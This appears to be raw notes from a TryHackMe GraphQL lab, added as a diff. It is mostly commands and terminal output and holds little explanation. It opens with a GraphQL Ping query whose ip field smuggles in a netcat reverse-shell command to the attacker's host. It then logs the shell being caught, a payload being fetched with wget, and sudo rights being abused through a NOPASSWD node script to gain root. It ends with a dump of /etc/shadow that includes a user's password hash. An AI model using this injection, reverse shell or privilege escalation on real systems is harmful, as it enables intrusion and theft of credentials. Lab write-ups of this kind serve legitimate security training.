@@ -1,0 +1,91 @@
+{
+  Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.121.137 4444 > /tmp/f"){
+    ip output
+  }
+}
+
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/graphQL]
+└─$ nc -lvnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.45.247.
+Ncat: Connection from 10.10.45.247:47368.
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+para@ubuntu:~$ cat /etc/shadow
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+para@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for para on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User para may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /usr/bin/node /home/para/server.js
+para@ubuntu:~$ cd /tmp
+wget http://10.6.121.137:8000/script.js
+--2021-12-16 09:33:47--  http://10.6.121.137:8000/script.js
+Connecting to 10.6.121.137:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 383 [application/javascript]
+Saving to: ‘script.js’
+
+script.js           100%[===================>]     383  --.-KB/s    in 0.006s  
+
+2021-12-16 09:33:47 (60.6 KB/s) - ‘script.js’ saved [383/383]
+
+para@ubuntu:/tmp$ cat script.js > /home/para/server.js
+cat script.js > /home/para/server.js
+para@ubuntu:/tmp$ cd /home/para
+cd /home/para
+para@ubuntu:~$ ls -l
+ls -l
+total 28
+drwxrwxr-x 54 para para  4096 Sep 30  2020 node_modules
+-rw-rw-r--  1 para para 17296 Sep 30  2020 package-lock.json
+-rw-rw-r--  1 para para   383 Dec 16 09:34 server.js
+para@ubuntu:~$ sudo /usr/bin/node /home/para/server.js
+sudo /usr/bin/node /home/para/server.js
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4445
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 10.10.45.247.
+Ncat: Connection from 10.10.45.247:57228.
+whoami
+root
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@ubuntu:~# cat /etc/shadow
+cat /etc/shadow
+root:!:18535:0:99999:7:::
+daemon:*:17647:0:99999:7:::
+bin:*:17647:0:99999:7:::
+sys:*:17647:0:99999:7:::
+sync:*:17647:0:99999:7:::
+games:*:17647:0:99999:7:::
+man:*:17647:0:99999:7:::
+lp:*:17647:0:99999:7:::
+mail:*:17647:0:99999:7:::
+news:*:17647:0:99999:7:::
+uucp:*:17647:0:99999:7:::
+proxy:*:17647:0:99999:7:::
+www-data:*:17647:0:99999:7:::
+backup:*:17647:0:99999:7:::
+list:*:17647:0:99999:7:::
+irc:*:17647:0:99999:7:::
+gnats:*:17647:0:99999:7:::
+nobody:*:17647:0:99999:7:::
+systemd-network:*:17647:0:99999:7:::
+systemd-resolve:*:17647:0:99999:7:::
+syslog:*:17647:0:99999:7:::
+messagebus:*:17647:0:99999:7:::
+_apt:*:17647:0:99999:7:::
+uuidd:*:18535:0:99999:7:::
+para:$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20:18535:0:99999:7:::
+root@ubuntu:~# 
